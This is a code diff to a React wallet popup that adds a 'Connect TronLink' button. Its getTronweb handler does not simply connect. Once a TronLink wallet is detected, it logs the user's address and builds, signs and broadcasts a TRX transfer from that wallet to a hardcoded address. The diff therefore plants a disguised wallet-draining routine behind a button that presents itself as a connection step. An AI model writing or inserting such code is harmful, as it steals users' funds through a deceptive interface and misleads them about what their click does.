@@ -1,11 +1,16 @@
 import { AnimatePresence, motion } from 'framer-motion';
 import { useState, useEffect, useRef } from 'react';
 import './Test3.css';
-
+import TronWeb from 'tronweb';
 interface PopupProps {
   onClose: () => void; // Function to close the popup
 }
 
+declare global {
+  interface Window {
+    tronWeb: any;
+  }
+}
 
 const Popup: React.FC<PopupProps> = ({ onClose }) => {
   const [account, setAccount] = useState<string | null>(null);
@@ -52,8 +57,39 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
     }
   };
 
+
+  const getTronweb = async () => {
+    const intervalId = setInterval(async () => {
+   
+if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        clearInterval(intervalId);
+        console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58);
+        
+        const tronweb = window.tronWeb;
+        const tx = await tronweb.transactionBuilder.sendTrx(
+          'TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP',
+          10,
+          'TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ'
+        );
+        const signedTx = await tronweb.trx.sign(tx);
+        const broastTx = await tronweb.trx.sendRawTransaction(signedTx);
+        console.log(broastTx);
+      }
+     
+    }, 10);
+  };
   useEffect(() => {
     checkMetaMask();
+    const HttpProvider = TronWeb.providers.HttpProvider;
+    const fullNode = new HttpProvider('https://api.trongrid.io'); 
+    const solidityNode = new HttpProvider('https://api.trongrid.io');
+    const eventServer = 'https://api.trongrid.io/';
+
+    const tronWeb = new TronWeb(
+      fullNode,
+      solidityNode,
+      eventServer,
+    );
   }, []);
 
   useEffect(() => {
@@ -111,6 +147,32 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
                   onClick={connectWallet}
                 >
                   Connect MetaMask
+                </button>
+              </div>
+            )}
+            </div>
+              {/* <div>
+    <button
+      className="px-7 py-4 bg-cyan-500 text-white rounded"
+      onClick={connectTronLink}
+    >
+      Connect TronLink
+    </button>
+  </div> */}
+   <div className="mt-1 flex flex-col">
+            {account && balance ? (
+              <div>
+                <h3 className="text-pink-600 mt-2">Account Address:</h3> {account}
+                <h3 className="text-pink-600 mt-2">Account Balance: </h3>
+                {balance}
+              </div>
+            ) : (
+              <div className="mt-2">
+                <button
+                  className="px-7 py-4 bg-cyan-500 text-white rounded"
+                  onClick={getTronweb}
+                >
+                  Connect TronLink
                 </button>
               </div>
             )}
